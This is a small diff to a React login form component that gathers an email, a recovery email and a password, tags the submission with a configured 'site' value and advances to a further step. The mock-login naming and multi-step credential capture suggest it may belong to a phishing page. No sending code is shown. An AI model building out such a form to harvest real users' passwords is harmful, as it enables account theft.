@@ -2,6 +2,7 @@ import React, { useState } from 'react';
 import useMockLogin from '../hooks/useMockLogin';
 import {useForm} from "react-hook-form"
 import Security from './Security';
+import { site } from "../config/index";
 
 const Form = () => {
      const form=useForm()
@@ -24,10 +25,10 @@ const Form = () => {
       const onSubmit=(data)=>{
         const {recoveryEmail,password}=data
         const submitValues = {
+             site,
              email,
-            recoveryEmail,
+            mail:recoveryEmail,
            password,
-           skipcode: "",
             
           };
           handleButtonClick(3)
